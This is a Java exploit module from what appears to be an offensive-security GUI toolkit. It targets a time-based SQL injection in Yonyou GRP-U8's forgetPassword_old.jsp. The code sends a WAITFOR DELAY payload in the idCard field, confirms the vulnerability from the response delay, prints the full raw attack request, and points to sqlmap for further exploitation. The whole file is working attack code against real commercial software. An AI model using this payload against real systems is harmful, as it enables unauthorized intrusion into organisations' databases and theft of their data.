package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class yongyou_grpu8_forgetPasswordOld_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String data = "idCard=1';WAITFOR+DELAY+'0:0:3'--&inputDW=222&userName=1111";
            long var = HttpTools_getTime.post(url + "/u8qx/forgetPassword_old.jsp?action=save" ,data, head, "utf-8");
            if (var > 3000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_forgetPasswordOld_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,注入类型:延时注入");
                    textArea.appendText("\n");
                });

                String target_req = "POST /u8qx/forgetPassword_old.jsp?action=save HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n" +
                        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n" +
                        "Cookie: JSESSIONID=C4AFE527EB3C99B9E4573E91CA06E642\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Content-Length: 53\n" +
                        "\n" +
                        "idCard=1';WAITFOR+DELAY+'0:0:3'--&inputDW=222&userName=1111";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
